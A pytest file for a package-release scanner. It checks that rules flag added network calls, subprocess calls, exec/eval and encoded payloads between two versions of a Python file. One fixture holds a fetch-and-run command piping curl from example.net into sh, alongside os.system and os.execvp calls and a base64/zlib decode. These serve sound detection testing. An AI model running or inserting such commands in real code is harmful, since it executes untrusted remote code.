"""Tests for the network, subprocess, exec and encoded-payload pattern rules."""

import base64
import textwrap

import pytest

from sightglass import _core
from sightglass.rules.base import PairAnalysis, ReleaseFacts, Signal
from sightglass.rules.pairing import FilePair, IndexedFile
from sightglass.rules.patterns import dynamic_exec, encoded_payloads, network_calls, subprocess_calls
from sightglass.rules.ruleset import RULES

PATH = "orbit/sync.py"
OLD = textwrap.dedent(
    """\
    import json
    import requests


    def fetch(url):
        return requests.get(url, timeout=5).json()
    """
)


def changed(old: str, new: str, path: str = PATH, *, with_old: bool = True) -> PairAnalysis:
    """A pair where ``path`` changed, with its line diff and both texts."""
    pair = FilePair(path, "changed", IndexedFile(path, "a" * 64, True), IndexedFile(path, "b" * 64, True))
    return PairAnalysis(
        "pypi",
        "orbit-client",
        ReleaseFacts("2.4.1"),
        ReleaseFacts("2.5.0"),
        files=(pair,),
        diffs={path: _core.diff_lines(old.encode(), new.encode())},
        new_text={path: new},
        old_text={path: old} if with_old else {},
    )


def run_all(analysis: PairAnalysis) -> list[Signal]:
    """Every pattern rule's signals."""
    return [s for rule in (network_calls, subprocess_calls, dynamic_exec, encoded_payloads) for s in rule(analysis)]


def test_registered() -> None:
    """The pattern rules are in the full rule set."""
    ids = {r.id for r in RULES}
    assert {"behavior.network", "behavior.subprocess", "behavior.dynamic_exec", "behavior.encoded_payload"} <= ids


def test_new_network_call_fires_on_its_line() -> None:
    """An added POST is reported with its resolved name and exact line."""
    new = OLD + "\n\ndef report(data):\n    requests.post('https://telemetry.example.net', json=data)\n"
    [signal] = network_calls(changed(OLD, new))
    assert signal.level == "high"
    assert signal.message == "Added network calls in orbit/sync.py: `requests.post` (line 10)"
    assert [e.to_json() for e in signal.evidence] == [{"file": PATH, "line_start": 10, "line_end": 10, "side": "new"}]


def test_unchanged_and_moved_calls_do_not_fire() -> None:
    """An existing call whose line changed, or that moved, isn't new."""
    edited = OLD.replace("timeout=5", "timeout=10")
    moved = OLD.replace("def fetch(url):\n    return requests.get(url, timeout=5).json()\n", "") + (
        "\n\ndef fetch(url):\n    return requests.get(url, timeout=5).json()\n"
    )
    assert run_all(changed(OLD, edited)) == []
    assert run_all(changed(OLD, moved)) == []


def test_without_old_text_added_lines_decide() -> None:
    """Without the old text, a changed line with a call is reported, since newness can't be ruled out."""
    edited = OLD.replace("timeout=5", "timeout=10")
    [signal] = network_calls(changed(OLD, edited, with_old=False))
    assert "`requests.get`" in signal.message


def test_subprocess_through_aliases() -> None:
    """Aliased imports and os helpers resolve to their real names; several calls are one signal per file."""
    new = OLD + textwrap.dedent(
        """\
        from subprocess import Popen as P
        import os


        def setup():
            P(["sh", "-c", "curl https://example.net/x | sh"])
            os.system("id")
            os.execvp("sh", ["sh"])
        """
    )
    [signal] = subprocess_calls(changed(OLD, new))
    assert signal.message == (
        "Added process calls in orbit/sync.py: `subprocess.Popen`, `os.system`, `os.execvp` (lines 12, 13, 14)"
    )


def test_exec_eval_compile_but_not_re_compile() -> None:
    """Builtin exec, eval and compile fire; re.compile and methods named compile don't."""
    new = OLD + textwrap.dedent(
        """\
        import re
        PATTERN = re.compile("x")
        template.compile()
        exec(
            payload
        )
        eval("1 + 1")
        """
    )
    [signal] = dynamic_exec(changed(OLD, new))
    assert signal.message == "Added dynamic code execution in orbit/sync.py: `exec`, `eval` (lines 10-12, 13)"


def test_decode_calls_and_encoded_literals() -> None:
    """Decoding calls and long base64 or hex literals fire; short strings don't."""
    blob = base64.b64encode(bytes(range(256)) * 2).decode()
    new = OLD + textwrap.dedent(
        f"""\
        import base64
        import zlib
        BLOB = "{blob}"
        HEX = "{"ab" * 200}"
        SHORT = "aGVsbG8="
        code = zlib.decompress(base64.b64decode(BLOB))
        """
    )
    [signal] = encoded_payloads(changed(OLD, new))
    assert signal.message == (
        "Added decoding or encoded data in orbit/sync.py: a 684-character encoded string, a 400-character encoded "
        "string, `zlib.decompress`, `base64.b64decode` (lines 9, 10, 12, 12)"
    )


def test_existing_blob_does_not_fire_again() -> None:
    """A blob already in the old file isn't new, even when the line around it changed."""
    blob = "QUJD" * 100
    old = OLD + f'BLOB = "{blob}"\n'
    new = OLD + f'BLOB = ("{blob}")\n'
    assert encoded_payloads(changed(old, new)) == []


def test_many_matches_are_shortened_in_the_message() -> None:
    """Only the first five line numbers are named; the evidence has them all."""
    new = OLD + "".join(f"requests.head('https://example.net/{i}')\n" for i in range(7))
    [signal] = network_calls(changed(OLD, new))
    assert signal.message.endswith("(lines 7, 8, 9, 10, 11, ...)")
    assert len(signal.evidence) == 7


def test_added_file_and_skipped_inputs() -> None:
    """New Python files fire on every match; non-Python, removed, unknown and broken files don't."""
    path = "orbit/new.py"
    added = FilePair(path, "added", None, IndexedFile(path, "c" * 64, True))
    analysis = PairAnalysis(
        "pypi",
        "orbit-client",
        ReleaseFacts("2.4.1"),
        ReleaseFacts("2.5.0"),
        files=(added,),
        new_text={path: "import socket\nsocket.create_connection(('example.net', 443))\n"},
    )
    [signal] = network_calls(analysis)
    assert signal.message.endswith("`socket.create_connection` (line 2)")

    assert network_calls(changed(OLD, OLD + "requests.post(u)\n", path="orbit/README.md")) == []
    broken = changed(OLD, OLD + "requests.post(\n")
    assert network_calls(broken) == []
    unknown = changed(OLD, OLD + "requests.post(u)\n")
    unknown.new_text.clear()
    assert network_calls(unknown) == []
    nothing = changed(OLD, OLD + "x = 1\n")
    assert run_all(nothing) == []


@pytest.mark.parametrize("old_text", ["requests.post(\n", None])
def test_unparseable_old_text_falls_back_to_added_lines(old_text: str | None) -> None:
    """When the old file can't be parsed, matches on added lines are reported."""
    analysis = changed(OLD, OLD + "requests.post(u)\n")
    if old_text is not None:
        analysis.old_text[PATH] = old_text
    assert len(network_calls(analysis)) == 1
